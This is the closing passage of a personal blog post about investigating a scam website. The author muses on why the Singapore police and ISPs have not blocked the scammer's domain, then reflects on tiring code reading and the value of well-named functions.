So I'm guessing the digital team at the Singapore Police Force know about this scammer? But I'm thinking perhaps the anonymity of the person registering the domain is making it hard to block it altogether.

I'm not well versed with how ISPs do blocking though, so do subdomains not fall under the blocking rules? I don't know, this is not my area of expertise.

## Wrapping up

Honestly, I think I started out strong, but fizzled out at the code reading because it was so tiring (I'm also down with COVID, give me a break). So the lesson learned here is, to be a good teammate and person who writes code that other people will end up reading, let's all try to name our functions well.

It would also be kinda fun if other people shared their experience with scam emails/SMS/DMs but then, there is a danger of getting shit installed on your device if you're not careful. Who knows, it might have happened to me already.

Oh well. I vaguely remember writing about the anatomy of the scam website years ago, but cannot for the life of myself find it. If you have ever seen it in your life, let me know?

Lastly, stay healthy, folks! Never touch your face without washing your hands first. <span class="emoji" role="img" tabindex="0" aria-label="face with medical mask">&#x1F637;</span>
